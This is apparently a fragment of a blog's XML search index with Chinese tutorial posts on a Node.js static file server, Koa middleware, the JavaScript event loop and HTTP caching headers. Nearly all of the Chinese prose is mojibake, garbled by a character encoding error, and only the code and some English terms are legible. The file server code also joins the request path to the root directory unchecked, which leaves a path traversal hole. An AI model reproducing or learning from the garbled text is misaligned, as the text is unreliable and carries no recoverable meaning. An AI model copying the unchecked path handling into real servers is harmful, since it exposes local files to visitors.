http://localhost:8080') å®žçŽ°ä¸€ä¸ªæ–‡ä»¶æœåŠ¡å™¨ï¼Œæ‹¼æŽ¥è®¿é—®è·¯å¾„è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œä»Žå‘½ä»¤å‚æ•°èŽ·å– root ç›®å½•ï¼Œé»˜è®¤æ˜¯å½“å‰ç›®å½• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var root = path.resolve('.')console.log('Static root dir:' + root)// åˆ›å»ºæœåŠ¡å™¨var server = http.createServer(function (request, response) &#123; // nodeæä¾›urlæ¨¡å—è§£æžurlå­—ç¬¦ä¸² èŽ·å–urlçš„path var pathname = url.parse(request.url).pathname if (pathname === '/favicon.ico') &#123; return &#125; console.log('url:', url.parse(request.url)) // èŽ·å–å¯¹åº”æœ¬åœ°æ–‡ä»¶è·¯å¾„ var filepath = path.join(root, pathname) // è¯»å–æ–‡ä»¶çŠ¶æ€ fs.stat(filepath, function (err, stats) &#123; // æ–‡ä»¶å‡ºé”™ if (err) &#123; console.log('file error!') response.end('&lt;h1&gt;file error!&lt;/h1&gt;') return &#125; // æ˜¯æ–‡ä»¶ if (stats.isFile()) &#123; console.log('200 ' + request.url) response.writeHead(200) // å°†æ–‡ä»¶æµå¯¼å…¥response fs.createReadStream(filepath).pipe(response) &#125; // æ–‡ä»¶ä¸å­˜åœ¨ else &#123; console.log('404 ' + request.url) response.writeHead(404) // å°†æ–‡ä»¶æµå¯¼å…¥response response.end('&lt;h1&gt;404 not found!&lt;/h1&gt;') &#125; &#125;)&#125;)server.listen(8080)console.info('Server is runing at http://localhost:8080/') express æ˜¯ç¬¬ä¸€ä»£æµè¡Œçš„ web æ¡†æž¶ï¼Œå®ƒå¯¹ Node.js çš„ HTTP è¿›è¡Œå°è£…ï¼Œè¯­æ³•åŸºäºŽ ES5ï¼Œè¦å®žçŽ°å¼‚æ­¥ä»£ç ï¼Œåªæœ‰ä¸€ä¸ªæ–¹æ³•ï¼šå›žè°ƒã€‚ koa2 å®Œå…¨åŸºäºŽ ES7 å¼€å‘ï¼Œä½¿ç”¨ Promise é…åˆ async å®žçŽ°å¼‚æ­¥ 12345678910111213141516171819202122232425262728// åˆ›å»ºä¸€ä¸ªKoaå¯¹è±¡const app = new Koa()// å¯¹äºŽä»»ä½•è¯·æ±‚ï¼Œappå°†è°ƒç”¨è¯¥å¼‚æ­¥å‡½æ•°å¤„ç†è¯·æ±‚// ctxæ˜¯koaå°è£…requestå’Œresponseå˜é‡// nextæ˜¯koaä¼ å…¥çš„å°†è¦å¤„ç†ä¸‹ä¸€ä¸ªå¼‚æ­¥å‡½æ•°// æ¯ä¸ªasyncå‡½æ•°ç§°ä¸ºmiddleware// app.use()é¡ºåºå†³å®šäº†middlewareçš„é¡ºåºapp.use(async (ctx, next) =&gt; &#123; fs.readFile('./data.txt', 'utf-8', function (err, data) &#123; console.log(data) &#125;) // è°ƒç”¨ä¸‹ä¸€ä¸ªmiddlewareï¼Œå¦‚æžœæ²¡æœ‰è°ƒç”¨ï¼Œåˆ™ä¸‹ä¸€ä¸ªmiddlewareä¸ä¼šæ‰§è¡Œ await next()&#125;)app.use(async (ctx, next) =&gt; &#123; ctx.response.type = 'text/html' ctx.response.body = '&lt;h1&gt;Hello, koa!&lt;/h1&gt;' console.log('response end') // è°ƒç”¨ä¸‹ä¸€ä¸ªmiddleware await next()&#125;)app.listen(3000)console.log('app started at http://localhost:3000/') æ¦‚å¿µå¼‚æ­¥é©±åŠ¨ç‰¹æ€§ï¼Œåœ¨ä¸»çº¿ç¨‹ä¸è¢« CPU å¯†é›†åž‹æ‰€å½±å“æ—¶ï¼Œå¯çœŸæ­£å‘æŒ¥å‡º Node.js é«˜å¹¶å‘ç‰¹æ€§ï¼Œå¯ä»¥ä½œä¸ºå¤§éƒ¨åˆ†ç½‘ç»œ I/O è¾ƒé«˜çš„åŽç«¯æœåŠ¡ã€‚]]></content>
      <categories>
        <category>nodejs</category>
      </categories>
      <tags>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç†è§£åŒæ­¥ã€å¼‚æ­¥å’Œäº‹ä»¶å¾ªçŽ¯]]></title>
    <url>%2F2018%2F04%2F20%2F%E7%90%86%E8%A7%A3%E5%90%8C%E6%AD%A5%E3%80%81%E5%BC%82%E6%AD%A5%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%2F</url>
    <content type="text"><![CDATA[JavaScriptè¿è¡Œæœºåˆ¶ï¼š æ‰€æœ‰åŒæ­¥ä»»åŠ¡éƒ½åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œå½¢æˆä¸€ä¸ªæ‰§è¡Œæ ˆï¼› ä¸»çº¿ç¨‹å‘èµ·å¼‚æ­¥è¯·æ±‚ï¼Œç›¸åº”çš„å·¥ä½œçº¿ç¨‹å°±ä¼šåŽ»æ‰§è¡Œå¼‚æ­¥ä»»åŠ¡ï¼Œä¸»çº¿ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡ŒåŽé¢çš„ä»£ç ï¼› ä¸»çº¿ç¨‹ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªâ€ä»»åŠ¡é˜Ÿåˆ—â€ï¼ˆtask queueï¼‰ã€‚åªè¦å¼‚æ­¥ä»»åŠ¡æœ‰äº†è¿è¡Œç»“æžœï¼Œå°±åœ¨â€ä»»åŠ¡é˜Ÿåˆ—â€ä¹‹ä¸­æ”¾ç½®ä¸€ä¸ªäº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ¶ˆæ¯ï¼› ä¸€æ—¦â€æ‰§è¡Œæ ˆâ€ä¸­çš„æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œç³»ç»Ÿå°±ä¼šè¯»å–â€ä»»åŠ¡é˜Ÿåˆ—â€ï¼Œçœ‹çœ‹é‡Œé¢æœ‰å“ªäº›äº‹ä»¶ã€‚é‚£äº›å¯¹åº”çš„å¼‚æ­¥ä»»åŠ¡ï¼ŒäºŽæ˜¯ç»“æŸç­‰å¾…çŠ¶æ€ï¼Œè¿›å…¥æ‰§è¡Œæ ˆï¼Œå¼€å§‹æ‰§è¡Œï¼› ä¸»çº¿ç¨‹æŠŠå½“å‰çš„äº‹ä»¶æ‰§è¡Œå®Œæˆä¹‹åŽï¼Œå†åŽ»è¯»å–ä»»åŠ¡é˜Ÿåˆ—ï¼Œå¦‚æ­¤åå¤é‡å¤æ‰§è¡Œï¼Œè¿™æ ·å°±è¡Œç¨‹äº†äº‹ä»¶å¾ªçŽ¯ã€‚ 1ã€å•çº¿ç¨‹JSå¼•æ“Žåœ¨è§£é‡Šå’Œæ‰§è¡ŒJavaScriptä»£ç çº¿ç¨‹åªæœ‰ä¸€ä¸ªï¼Œå«åšä¸»çº¿ç¨‹ã€‚ä½†å®žé™…è¿˜å­˜åœ¨å…¶ä»–çº¿ç¨‹ï¼Œå¦‚ï¼šå¤„ç†Ajaxè¯·æ±‚çº¿ç¨‹ï¼Œå¤„ç†DOMäº‹ä»¶çº¿ç¨‹ï¼Œå®šæ—¶å™¨çº¿ç¨‹ï¼Œå’Œæ–‡ä»¶è¯»å†™çº¿ç¨‹ç­‰ï¼Œå«åšå·¥ä½œçº¿ç¨‹ã€‚ 2ã€åŒæ­¥å’Œå¼‚æ­¥åŒæ­¥ï¼šå¦‚æžœå‡½æ•°è¿”å›žçš„æ—¶å€™ï¼Œè°ƒç”¨è€…å°±èƒ½å¤Ÿå¾—åˆ°é¢„æœŸç»“æžœã€‚ 1Math.sqrt(2); å¼‚æ­¥ï¼šå‡½æ•°è¿”å›žçš„æ—¶å€™ï¼Œè°ƒç”¨è€…è¿˜ä¸èƒ½å¤Ÿå¾—åˆ°é¢„æœŸç»“æžœï¼Œè€Œæ˜¯éœ€è¦é€šè¿‡ä¸€å®šæ‰‹æ®µå¾—åˆ°ã€‚ 123fs.readFile(&quot;foo.txt&quot;, &quot;utf8&quot;, function(err, data)&#123; console.log(data)&#125;) ä¸Šé¢ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›fs.readFileå‡½æ•°è¯»å–æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯åœ¨fs.readFileå‡½æ•°è¿”å›žæ—¶ï¼Œæˆ‘ä»¬æœŸæœ›çš„ç»“æžœå¹¶ä¸ä¼šå‘ç”Ÿï¼Œè€Œæ˜¯è¦ç­‰æ–‡ä»¶å…¨éƒ¨è¯»å–å®Œæˆä¹‹åŽã€‚ å¼‚æ­¥AJAXï¼š ä¸»çº¿ç¨‹ï¼šâ€œä½ å¥½ï¼ŒAJAXçº¿ç¨‹ã€‚è¯·ä½ å¸®æˆ‘å‘ä¸ªHTTPè¯·æ±‚å§ï¼Œæˆ‘æŠŠè¯·æ±‚åœ°å€å’Œå‚æ•°éƒ½ç»™ä½ äº†ã€‚â€ AJAXçº¿ç¨‹ï¼šâ€œå¥½çš„ï¼Œä¸»çº¿ç¨‹ã€‚æˆ‘é©¬ä¸ŠåŽ»å‘ï¼Œä½†å¯èƒ½è¦èŠ±ç‚¹å„¿æ—¶é—´å‘¢ï¼Œä½ å¯ä»¥å…ˆåŽ»å¿™åˆ«çš„ã€‚â€ ä¸»çº¿ç¨‹ï¼šï¼šâ€œè°¢è°¢ï¼Œä½ æ‹¿åˆ°å“åº”åŽå‘Šè¯‰æˆ‘ä¸€å£°å•Šã€‚â€ (æŽ¥ç€ï¼Œä¸»çº¿ç¨‹åšå…¶ä»–äº‹æƒ…åŽ»äº†ã€‚ä¸€é¡¿é¥­çš„æ—¶é—´åŽï¼Œå®ƒæ”¶åˆ°äº†å“åº”åˆ°è¾¾çš„é€šçŸ¥ã€‚) åŒæ­¥AJAXï¼š ä¸»çº¿ç¨‹ï¼šâ€œä½ å¥½ï¼ŒAJAXçº¿ç¨‹ã€‚è¯·ä½ å¸®æˆ‘å‘ä¸ªHTTPè¯·æ±‚å§ï¼Œæˆ‘æŠŠè¯·æ±‚åœ°å€å’Œå‚æ•°éƒ½ç»™ä½ äº†ã€‚â€ AJAXçº¿ç¨‹ï¼šâ€œâ€¦â€¦â€ ä¸»çº¿ç¨‹ï¼šï¼šâ€œå–‚ï¼ŒAJAXçº¿ç¨‹ï¼Œä½ æ€Žä¹ˆä¸è¯´è¯ï¼Ÿâ€ AJAXçº¿ç¨‹ï¼šâ€œâ€¦â€¦â€ ä¸»çº¿ç¨‹ï¼šï¼šâ€œå–‚ï¼å–‚å–‚å–‚ï¼â€ AJAXçº¿ç¨‹ï¼šâ€œâ€¦â€¦â€ (ä¸€ç‚·é¦™çš„æ—¶é—´åŽ) ä¸»çº¿ç¨‹ï¼šï¼šâ€œå–‚ï¼æ±‚ä½ è¯´å¥è¯å§ï¼â€ AJAXçº¿ç¨‹ï¼šâ€œä¸»çº¿ç¨‹ï¼Œä¸å¥½æ„æ€ï¼Œæˆ‘åœ¨å·¥ä½œçš„æ—¶å€™ä¸èƒ½è¯´è¯ã€‚ä½ çš„è¯·æ±‚å·²ç»å‘å®Œäº†ï¼Œæ‹¿åˆ°å“åº”æ•°æ®äº†ï¼Œç»™ä½ ã€‚â€ æ­£å› ä¸ºJavaScriptæ—¶å•çº¿ç¨‹ï¼ŒåŒæ­¥å®¹æ˜“é€ æˆé˜»å¡žï¼Œæ‰€ä»¥ï¼Œå¯¹äºŽè€—æ—¶å’Œæ“ä½œäº‹ä»¶ä¸ç¡®å®šæ“ä½œï¼Œä½¿ç”¨å¼‚æ­¥å°±æˆäº†å¿…ç„¶é€‰æ‹©ã€‚ 3ã€å¼‚æ­¥è¿‡ç¨‹ä¸€ä¸ªå¼‚æ­¥è¿‡ç¨‹é€šå¸¸æ—¶è¿™æ ·çš„ï¼š ä¸»çº¿ç¨‹å‘èµ·ä¸€ä¸ªå¼‚æ­¥è¯·æ±‚ï¼Œç›¸åº”çš„å·¥ä½œçº¿ç¨‹æŽ¥æ”¶çº¿ç¨‹è¯·æ±‚å¹¶å‘ŠçŸ¥ä¸»çº¿ç¨‹å·²æ”¶åˆ°ï¼›ä¸»çº¿ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡ŒåŽé¢çš„ä»£ç ï¼ŒåŒæ—¶å·¥ä½œçº¿ç¨‹æ‰§è¡Œå¼‚æ­¥ä»»åŠ¡ï¼›å·¥ä½œçº¿ç¨‹å®Œæˆå·¥ä½œåŽï¼Œé€šçŸ¥ä¸»çº¿ç¨‹ï¼›ä¸»çº¿ç¨‹æ”¶åˆ°é€šçŸ¥åŽï¼Œæ‰§è¡Œä¸€å®šåŠ¨ä½œï¼ˆè°ƒç”¨å›žè°ƒå‡½æ•°ï¼‰ã€‚ å¼‚æ­¥å‡½æ•°é€šå¸¸å…·æœ‰ä¸€ä¸‹å½¢å¼ï¼š 1A(arg..., callbackFn) ä»–å¯ä»¥å«åšå¼‚æ­¥è¿‡ç¨‹çš„å‘èµ·å‡½æ•°ï¼Œæˆ–è€…å«åšå¼‚æ­¥ä»»åŠ¡æ³¨å†Œå‡½æ•°ã€‚ ä»Žä¸»çº¿ç¨‹çš„è§’åº¦çœ‹ï¼Œä¸€ä¸ªä¸€åº¦è¿‡ç¨‹åŒ…æ‹¬ä¸¤ä¸ªè¦ç´ ï¼š å‘èµ·å‡½æ•°ï¼ˆæ³¨å†Œå‡½æ•°ï¼‰ å›žåˆ°å‡½æ•° 4ã€æ¶ˆæ¯é˜Ÿåˆ—å’Œäº‹ä»¶å¾ªçŽ¯å¼‚æ­¥è¿‡ç¨‹ä¸­ï¼Œå·¥ä½œçº¿ç¨‹åœ¨å¼‚æ­¥æ“ä½œå®ŒæˆåŽéœ€è¦é€šçŸ¥ä¸»çº¿ç¨‹ã€‚é‚£ä¹ˆè¿™ä¸ªé€šçŸ¥æœºåˆ¶æ—¶æ€Žæ ·å®žçŽ°çš„å‘¢ï¼Ÿç­”æ¡ˆæ˜¯åˆ©ç”¨æ¶ˆæ¯é˜Ÿåˆ—å’Œäº‹ä»¶å¾ªçŽ¯ã€‚ ä¸€å¥è¯æ¦‚æ‹¬ï¼š å·¥ä½œçº¿ç¨‹å°†æ¶ˆæ¯æ”¾åˆ°æ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¸»çº¿ç¨‹é€šè¿‡äº‹ä»¶å¾ªçŽ¯è¿‡ç¨‹åŽ»å–æ¶ˆæ¯ã€‚ æ¶ˆæ¯é˜Ÿåˆ—ï¼šæ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä¸€ä¸ªå…ˆè¿›å…ˆå‡ºçš„é˜Ÿåˆ—ï¼Œæ”¾ç€å„ç§æ¶ˆæ¯ã€‚ äº‹ä»¶å¾ªçŽ¯ï¼šäº‹ä»¶å¾ªçŽ¯æ˜¯æŒ‡ä¸»çº¿ç¨‹ä»Žæ¶ˆæ¯é˜Ÿåˆ—ä¸­å–æ¶ˆæ¯ï¼Œæ‰§è¡Œçš„è¿‡ç¨‹ã€‚ å®žé™…ä¸Šï¼Œä¸»çº¿ç¨‹åªä¼šåšä¸€ä»¶äº‹ï¼Œå°±æ˜¯ä»Žæ¶ˆæ¯é˜Ÿåˆ—é‡Œé¢å–æ¶ˆæ¯ã€æ‰§è¡Œæ¶ˆæ¯ï¼Œå†åŽ»æ¶ˆæ¯ï¼Œå†æ‰§è¡Œã€‚å½“æ¶ˆæ¯é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œå°±ä¼šç­‰å¾…çŸ¥é“æ¶ˆæ¯é˜Ÿåˆ—å˜æˆéžç©ºã€‚è€Œä¸”ä¸»çº¿ç¨‹åªæœ‰åœ¨å°†å½“å‰çš„æ¶ˆæ¯æ‰§è¡Œå®ŒæˆåŽï¼Œæ‰ä¼šåŽ»å–ä¸‹ä¸€ä¸ªæ¶ˆæ¯ã€‚è¿™ç§æœºåˆ¶å°±å«åšäº‹ä»¶å¾ªçŽ¯æœºåˆ¶ï¼Œå–ä¸€ä¸ªæ¶ˆæ¯å¹¶æ‰§è¡Œçš„è¿‡ç¨‹å«åšä¸€æ¬¡å¾ªçŽ¯ã€‚ æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ”¾çš„æ¶ˆæ¯æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Ÿæ¶ˆæ¯çš„å…·ä½“ç»“æž„å½“ç„¶è·Ÿå…·ä½“çš„å®žçŽ°æœ‰å…³ï¼Œå¯ä»¥è®¤ä¸ºï¼š æ¶ˆæ¯å°±æ˜¯æ³¨å†Œå¼‚æ­¥ä»»åŠ¡æ—¶æ·»åŠ çš„å›žè°ƒå‡½æ•°ã€‚ ä»¥å¼‚æ­¥Ajaxä¸ºä¾‹ 123$.ajax(&apos;http://segmentfault.com&apos;, function(resp) &#123; console.log(&apos;æˆ‘æ˜¯å“åº”ï¼š&apos;, resp);&#125;); ä¸»çº¿ç¨‹å‘èµ·Ajaxè¯·æ±‚åŽï¼Œä¼šç»§ç»­æ‰§è¡Œå…¶ä»–ä»£ç ã€‚Ajaxçº¿ç¨‹è´Ÿè´£è¯·æ±‚ segmentfault.comï¼Œæ‹¿åˆ°å“åº”åŽï¼Œå®ƒä¼šæŠŠå“åº”å°è£…æˆä¸€ä¸ªJavaScriptå¯¹è±¡ï¼Œç„¶åŽæž„æˆä¸€æ¡æ¶ˆæ¯ï¼š 1234var message = function() &#123; callbackFn();&#125; å…¶ä¸­callbackFnå°±æ˜¯å‰é¢ä»£ç ä¸­æˆåŠŸå“åº”æ—¶çš„å›žè°ƒå‡½æ•°ã€‚ ä¸»çº¿ç¨‹åœ¨æ‰§è¡Œå®Œå½“å‰å¾ªçŽ¯ä¸­æ‰€æœ‰ä»£ç åŽï¼Œå°±ä¼šåˆ°æ¶ˆæ¯é˜Ÿåˆ—å–å‡ºè¿™æ¡æ¶ˆæ¯ï¼ˆä¹Ÿå°±æ˜¯messageå‡½æ•°ï¼‰ï¼Œå¹¶æ‰§è¡Œå®ƒï¼Œåˆ°æ­¤ä¸ºæ­¢ï¼Œå°±å®Œæˆäº†å·¥ä½œçº¿ç¨‹å¯¹ä¸»çº¿ç¨‹çš„é€šçŸ¥ï¼Œå›žè°ƒå‡½æ•°ä¹Ÿå°±å¾—åˆ°äº†æ‰§è¡Œã€‚å¦‚æžœä¸€å¼€å§‹ä¸»çº¿ç¨‹å°±æ²¡æœ‰æä¾›å›žè°ƒå‡½æ•°ï¼ŒAjaxçº¿ç¨‹åœ¨æ”¶åˆ°HTTPå“åº”åŽï¼Œä¹Ÿå°±æ²¡æœ‰å¿…è¦é€šçŸ¥ä¸»çº¿ç¨‹ï¼Œä»Žè€Œæ²¡å¿…è¦å¾€æ¶ˆæ¯é˜Ÿåˆ—æ”¾æ¶ˆæ¯ã€‚ å¼‚æ­¥è¿‡ç¨‹çš„å›žè°ƒå‡½æ•°ï¼Œä¸€å®šä¸åœ¨å½“å‰è¿™ä¸€è½®äº‹ä»¶å¾ªçŽ¯ä¸­æ‰§è¡Œã€‚ 5ã€å¼‚æ­¥ä¸Žäº‹ä»¶ æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ¯æ¡æ¶ˆæ¯å®žé™…ä¸Šéƒ½å¯¹åº”ç€ä¸€ä¸ªäº‹ä»¶ æœ‰ä¸€ç±»å¾ˆé‡è¦çš„å¼‚æ­¥è¿‡ç¨‹ï¼šDOMäº‹ä»¶ 1234var button = document.getElement(&apos;#btn&apos;);button.addEventListener(&apos;click&apos;, function(e) &#123; console.log();&#125;); ä»Žäº‹ä»¶çš„è§’åº¦æ¥çœ‹ï¼Œä¸Šè¿°ä»£ç è¡¨ç¤ºï¼šåœ¨æŒ‰é’®ä¸Šæ·»åŠ äº†ä¸€ä¸ªé¼ æ ‡å•å‡»äº‹ä»¶çš„äº‹ä»¶ç›‘å¬å™¨ï¼›å½“ç”¨æˆ·ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œé¼ æ ‡å•å‡»äº‹ä»¶è§¦å‘ï¼Œäº‹ä»¶ç›‘å¬å™¨å‡½æ•°è¢«è°ƒç”¨ã€‚ ä»Žå¼‚æ­¥è¿‡ç¨‹çš„è§’åº¦çœ‹ï¼ŒaddEventListenerå‡½æ•°å°±æ˜¯å¼‚æ­¥è¿‡ç¨‹çš„å‘èµ·å‡½æ•°ï¼Œäº‹ä»¶ç›‘å¬å™¨å‡½æ•°å°±æ˜¯å¼‚æ­¥è¿‡ç¨‹çš„å›žè°ƒå‡½æ•°ã€‚äº‹ä»¶è§¦å‘æ—¶ï¼Œè¡¨ç¤ºå¼‚æ­¥ä»»åŠ¡å®Œæˆï¼Œä¼šå°†äº‹ä»¶ç›‘å¬å™¨å‡½æ•°å°è£…æˆä¸€æ¡æ¶ˆæ¯æ”¾åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç­‰å¾…ä¸»çº¿ç¨‹æ‰§è¡Œã€‚ äº‹ä»¶çš„æ¦‚å¿µå®žé™…ä¸Šå¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œäº‹ä»¶æœºåˆ¶å®žé™…ä¸Šå°±æ˜¯å¼‚æ­¥è¿‡ç¨‹çš„é€šçŸ¥æœºåˆ¶ã€‚æˆ‘è§‰å¾—å®ƒçš„å­˜åœ¨æ˜¯ä¸ºäº†ç¼–ç¨‹æŽ¥å£å¯¹å¼€å‘è€…æ›´å‹å¥½ã€‚ å¦ä¸€æ–¹é¢ï¼Œæ‰€æœ‰çš„å¼‚æ­¥è¿‡ç¨‹ä¹Ÿéƒ½å¯ä»¥ç”¨äº‹ä»¶æ¥æè¿°ã€‚ä¾‹å¦‚ï¼šsetTimeoutå¯ä»¥çœ‹æˆå¯¹åº”ä¸€ä¸ªæ—¶é—´åˆ°äº†ï¼çš„äº‹ä»¶ã€‚å‰æ–‡çš„setTimeout(fn, 1000);å¯ä»¥çœ‹æˆï¼š 1timer.addEventListener(&apos;timeout&apos;, 1000, fn); å·¥ä½œçº¿ç¨‹æ˜¯ç”Ÿäº§è€…ï¼Œä¸»çº¿ç¨‹æ˜¯æ¶ˆè´¹è€…(åªæœ‰ä¸€ä¸ªæ¶ˆè´¹è€…)ã€‚å·¥ä½œçº¿ç¨‹æ‰§è¡Œå¼‚æ­¥ä»»åŠ¡ï¼Œæ‰§è¡Œå®ŒæˆåŽæŠŠå¯¹åº”çš„å›žè°ƒå‡½æ•°å°è£…æˆä¸€æ¡æ¶ˆæ¯æ”¾åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼›ä¸»çº¿ç¨‹ä¸æ–­åœ°ä»Žæ¶ˆæ¯é˜Ÿåˆ—ä¸­å–æ¶ˆæ¯å¹¶æ‰§è¡Œï¼Œå½“æ¶ˆæ¯é˜Ÿåˆ—ç©ºæ—¶ä¸»çº¿ç¨‹é˜»å¡žï¼Œç›´åˆ°æ¶ˆæ¯é˜Ÿåˆ—å†æ¬¡éžç©ºã€‚ 6ã€macrotasksä¸Žmicrotasksçš„åŒºåˆ« macrotasks: setTimeout setInterval setImmediate I/O UIæ¸²æŸ“ microtasks: Promise process.nextTick Object.observe MutationObserver microtaskä¼šåœ¨å½“å‰å¾ªçŽ¯ä¸­æ‰§è¡Œå®Œæˆ,è€Œmacrotaskä¼šåœ¨ä¸‹ä¸€ä¸ªå¾ªçŽ¯ä¸­æ‰§è¡Œ]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPç¼“å­˜æœºåˆ¶]]></title>
    <url>%2F2018%2F04%2F18%2FHTTP%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[åªå…³æ³¨å‰ç«¯æ–¹é¢ç¼“å­˜æœºåˆ¶çš„ï¼Œå¯èƒ½åªæ¸…æ¥šåœ¨HTMLé¡µmetaæ ‡ç­¾å¤„ç† 1&lt;meta http-equiv=&quot;Pragma&quot; content=&quot;no-store&quot;&gt; ç›®çš„æ˜¯ä¸ºäº†ä¸è®©æµè§ˆå™¨ç¼“å­˜å½“å‰é¡µé¢ã€‚ä½†æ˜¯ä»£ç†æœåŠ¡å™¨ä¸è§£æžHTMLå†…å®¹ã€‚è¿™æ ·ä¸€èˆ¬åœ¨æœåŠ¡å™¨ç«¯å¯¹HTTPè¯·æ±‚å¤´è¿›è¡Œå¤„ç†æŽ§åˆ¶ç¼“å­˜ã€‚ HTTPå¤´æŽ§åˆ¶ç¼“å­˜ å¤§è‡´åˆ†ä¸ºä¸¤ç§ï¼šå¼ºç¼“å­˜å’Œåå•†ç¼“å­˜ã€‚å¼ºç¼“å­˜å¦‚æžœå‘½ä¸­ç¼“å­˜ä¸éœ€è¦å’ŒæœåŠ¡å™¨å‘ç”Ÿäº¤äº’ï¼Œè€Œåå•†ç¼“å­˜ä¸ç®¡æ˜¯å¦å‘½ä¸­éƒ½è¦å’ŒæœåŠ¡å™¨ç«¯è¿›è¡Œäº¤äº’ï¼Œå¼ºåˆ¶ç¼“å­˜çš„ä¼˜å…ˆçº§é«˜äºŽåå•†ç¼“å­˜ã€‚ åŒ¹é…æµç¨‹ç¤ºæ„å›¾ï¼š ==æ•²é»‘æ¿ï¼šå¼ºç¼“å­˜æ ¹æ®Expireæˆ–Cache-Controlåˆ¤æ–­ï¼Œåå•†ç¼“å­˜æ ¹æ®Last-Modifiedæˆ–ETagåˆ¤æ–­ï¼Œå¼ºç¼“å­˜ä¼˜å…ˆçº§å¤§äºŽåå•†ç¼“å­˜== å¼ºç¼“å­˜ å¯ä»¥ç†è§£ä¸ºæ— éœ€éªŒè¯ç¼“å­˜ç­–ç•¥ã€‚ ExpiresExpiresæŒ‡ç¼“å­˜è¿‡æœŸæ—¶é—´ï¼Œè¶…è¿‡æ—¶é—´ç‚¹å°±ä»£è¡¨èµ„æºè¿‡æœŸã€‚ Cache-ControlCache-Controlå¯ä»¥ç”±å¤šä¸ªå­—æ®µç»„æˆï¼Œæœ‰ä¸€ä¸‹å–å€¼ï¼š max-age æŒ‡å®šä¸€ä¸ªæ—¶é—´é•¿åº¦ï¼Œå•ä½sã€‚åœ¨æ²¡æœ‰ç¦ç”¨ç¼“å­˜å¹¶ä¸”æ²¡æœ‰è¶…è¿‡æœ‰æ•ˆæ—¶é—´ï¼Œå†æ¬¡è®¿é—®è¿™ä¸ªèµ„æºä¼šå‘½ä¸­ç¼“å­˜ï¼Œä¸ä¼šå‘æœåŠ¡å™¨è¯·æ±‚èµ„æºè€Œæ˜¯ç›´æŽ¥ä»Žæµè§ˆå™¨ä¸­å–ã€‚ s-maxage åŒmax-ageï¼Œè¦†ç›–max-ageã€Expiresï¼Œä»…é€‚ç”¨å…±äº«ç¼“å­˜ï¼Œåœ¨ç§æœ‰ç¼“å­˜ä¸­è¢«å¿½ç•¥ã€‚ public è¡¨æ˜Žå“åº”å¯ä»¥è¢«ä»»ä½•å¯¹è±¡ï¼ˆå‘é€è¯·æ±‚å’Œå®¢æˆ·ç«¯ã€ä»£ç†æœåŠ¡å™¨ï¼‰ç¼“å­˜ã€‚ private è¡¨æ˜Žå“åº”åªèƒ½è¢«å•ä¸ªç”¨æˆ·ï¼ˆå¯èƒ½æ˜¯æ“ä½œç³»ç»Ÿç”¨æˆ·ã€æµè§ˆå™¨ç”¨æˆ·ï¼‰ç¼“å­˜ï¼Œæ˜¯éžå…±äº«çš„ï¼Œä¸èƒ½è¢«ä»£ç†æœåŠ¡å™¨ç¼“å­˜ã€‚ no-chache å¼ºåˆ¶æ‰€æœ‰ç¼“å­˜äº†è¯¥å“åº”çš„ç”¨æˆ·ï¼Œåœ¨ä½¿ç”¨å·²ç¼“å­˜çš„æ•°æ®å‰ï¼Œå‘é€å¾…éªŒè¯å™¨è¯·æ±‚åˆ°æœåŠ¡å™¨ã€‚==ä¸æ˜¯å­—é¢æ„æ€ä¸Šçš„ä¸ç¼“å­˜==ã€‚ no-store ç¦æ­¢ç¼“å­˜ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½è¦å‘æœåŠ¡å™¨é‡æ–°èŽ·å–æ•°æ®ã€‚ åå•†ç¼“å­˜ ç¼“å­˜çš„èµ„æºåˆ°æœŸäº†ï¼Œå¹¶ä¸æ„å‘³ç€èµ„æºå†…å®¹å‘ç”Ÿäº†æ”¹å˜ï¼Œå¦‚æžœå’ŒæœåŠ¡å™¨ä¸Šçš„èµ„æºæ²¡æœ‰å·®åˆ«ï¼Œå®žé™…ä¸Šæ²¡æœ‰å¿…è¦å†æ¬¡è¯·æ±‚ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šè¿‡æŸç§éªŒè¯æœºåˆ¶éªŒè¯å½“å‰è¯·æ±‚èµ„æºæ˜¯å¦å¯ä»¥ä½¿ç”¨ç¼“å­˜ã€‚ Last-modified/If-Modified-SinceLast-modifiedè¡¨ç¤ºæœåŠ¡å™¨ç«¯èµ„æºçš„æœ€åŽä¿®æ”¹æ—¶é—´ï¼Œå“åº”å¤´éƒ¨ä¼šå¸¦ä¸Šè¿™ä¸ªæ 